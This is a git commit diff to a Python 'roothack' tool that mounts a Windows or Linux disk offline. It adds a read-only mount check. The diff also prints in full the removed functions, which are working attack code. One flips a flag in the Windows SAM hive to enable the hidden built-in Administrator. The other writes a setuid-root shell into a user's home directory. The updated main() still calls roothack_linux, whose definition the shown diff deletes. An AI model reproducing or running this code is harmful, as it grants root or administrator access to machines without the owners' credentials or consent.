b4275d5c4efeff238b9dc7b121e29b96d6d9388c
highghlow <highghlow@proton.me>
2023-07-02 19:41:45 +0300

    Added readonly check for windows filesystems

--- main.py
+++ main.py
@@ -71,144 +71,17 @@ def mount_device(os, device):
     run("mount "+device+" "+target)
     return target
 
-def is_linux(device):
-    try:
-        ls_output = run("debugfs -R \"ls -l\" "+device)
-    except subprocess.CalledProcessError as e:
-        print(e)
-        return False
-    ls_lines = ls_output.split("\n")
-    ls_contents = set([i.split(" ")[-1] for i in ls_lines])
-    if LINUX_ROOT.intersection(ls_contents) == LINUX_ROOT: # LINUX_ROOT is fully contained in ls_contents
-        return True
-    else:
-        return False
-
-def is_windows(device):
-    try:
-        ls_output = run("sudo ntfsls -f "+device)
-    except subprocess.CalledProcessError as e:
-        print(e)
-        return False
-    ls_contents = ls_output.split("\n")
-    if WINDOWS_ROOT.intersection(ls_contents) == WINDOWS_ROOT: # WINDOWS_ROOT is fully contained in ls_contents
-        return True
-    else:
-        return False
-
-def roothack_windows(mountpoint):
-    print("Windows roothack")
-    HKLM_Sam_Hive = oslib.path.join(mountpoint, "Windows/System32/config/SAM")
-    print("Hive:", HKLM_Sam_Hive)
-    print("Exporting elevated admin...")
-    export = run(rf"hivexregedit --export {HKLM_Sam_Hive} 'SAM\Domains\Account\Users\000001F4'")
-    values = export.split("\n")
-    f = None
-    for value in values:
-        if value.startswith("\"F\"="):
-            f = value[4:]
-    bts = f.split(":", maxsplit=1)[1].split(",")
-    print("Value:", bts)
-    enabled = bts[56]
-    if enabled == "10":
-        print("System is already roothacked")
-        if input("Do you wand to remove it (N/y)? ").lower() == "y":
-            print("Creating temp.reg...")
-            bts[56] = "11"
-            contents = fr"""
-[\SAM\Domains\Account\Users\000001F4]
-"F"=hex(3):{",".join(bts)}
-    """
-            with open("temp.reg", "w") as f:
-                f.write(contents)
-            print("Writing...")
-            run(rf"hivexregedit --merge {HKLM_Sam_Hive} temp.reg")
-            print("Ceaning up...")
-            oslib.remove("temp.reg")
-            print("Disabled ElevatedAdmin")
-        exit(0)
-    if enabled != "11" and enabled != "10":
-        print("Elevated Admin user is corrupted.")
-        if input("Try to recover (The system may be damaged!) (N/y)? ").lower() == "y":
-            enabled = "11"
-        else:
-            exit(1)
-    if enabled == "11":
-        print("Creating temp.reg...")
-        bts[56] = "10"
-        contents = fr"""
-[\SAM\Domains\Account\Users\000001F4]
-"F"=hex(3):{",".join(bts)}
-"""
-        with open("temp.reg", "w") as f:
-            f.write(contents)
-        print("Writing...")
-        run(rf"hivexregedit --merge {HKLM_Sam_Hive} temp.reg")
-        print("Ceaning up...")
-        print("Enabled EvelatedAdmin")
-        print("You can now boot back into the os log in as Administrator")
-        print("This account can have diffrent names depending on the system language")
-        oslib.remove("temp.reg")
-
-def run_chroot(chroot, cmd):
-    proc = subprocess.Popen(f"sudo chroot {chroot} {cmd}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    proc.wait()
-    out, err = proc.communicate()
-    if err:
-        raise RuntimeError(err)
-    return out.decode("utf-8")
-
-def roothack_linux(mountpoint):
-    print("Linux roothack")
-    print("Loading users...")
-    uid_min = int(run_chroot(mountpoint, "awk '/^UID_MIN/ {print $2}' /etc/login.defs"))
-    uid_max = int(run_chroot(mountpoint, "awk '/^UID_MAX/ {print $2}' /etc/login.defs"))
-    print(f"Min UID: {uid_min}")
-    print(f"Max UID: {uid_max}")
-    users = []
-    with open(oslib.path.join(mountpoint, "etc/passwd")) as f:
+def is_readonly(mountpoint):
+    with open("/proc/mounts") as f:
         for line in f:
-            uname, passwd, uid, gid, longname, homedir, cmd = line.split(":")
-            uid, gid = int(uid), int(gid)
-            if uid_min <= uid <= uid_max:
-                users.append((uname, homedir))
-    users.append(("all", "/usr/share"))
-    print(f"Found {len(users)-1} users")
-    for ind, userdata in enumerate(users):
-        username, home = userdata
-        if oslib.path.exists(oslib.path.join(mountpoint, home, "iamroot")):
-            print(f"[{ind}] {username} ({home}) (roothacked)")
-        else:
-            print(f"[{ind}] {username} ({home})")
-    userind = int(input("Select user to give root to: "))
-    user = users[userind]
-    location_local = mountpoint + oslib.path.join(user[1], "iamroot")
-    location_chroot = oslib.path.join(user[1], "iamroot")
-
-    print(f"Saving to {location_chroot}...")
-    if oslib.path.exists(location_local):
-        print("System is already roothacked")
-        if input("Do you wand to remove it (N/y)? ").lower() == "y":
-            oslib.remove(location_local)
-            print(f"Removed {location_chroot}")
-        exit(0)
-
-    with open("shell", "br") as f: executable = f.read()
-
-    with open(location_local, "bw") as f:
-        f.write(executable)
-
-    cmd = f"sh -c \"chown root {location_chroot} & chmod ugo+rx {location_chroot} & chmod u+sx {location_chroot}\""
-    print(f"chroot running> {cmd}")
-    run_chroot(mountpoint, cmd)
-
-    cmd = f"chmod u+s {location_chroot}"
-    print(f"chroot running> {cmd}")
-    run_chroot(mountpoint, cmd)
-
-    print("Saved root shell at", location_chroot)
-    print("You can now boot back into the os and run:")
-    print("~/iamroot")
+            device, mount, driver, tags, _, _ = line.split(" ", maxsplit=6)
+            if mount == mountpoint.rstrip("/"):
+                tags = tags.split(",")
+                if "ro" in tags:
+                    return True
+                else:
+                    return False
+    raise ValueError("Mountpoint not found in /proc/mounts")
 
 def main():
     if oslib.getuid() != 0:
@@ -258,7 +131,12 @@ def main():
     mountpoint = mount_device(os, device)
     print("Mounted as", mountpoint)
     if os == "Windows":
-        roothack_windows(mountpoint)
+        if is_readonly(mountpoint):
+            print("The filesystem was mounted as readonly")
+            print("This could mean that windows was not shut down properly")
+            print("To fully shutdown Windows press Shift+PowerOff in the start menu")
+            exit(1)
+        windows.roothack_windows(mountpoint)
     elif os.startswith("Linux"):
         roothack_linux(mountpoint)
     
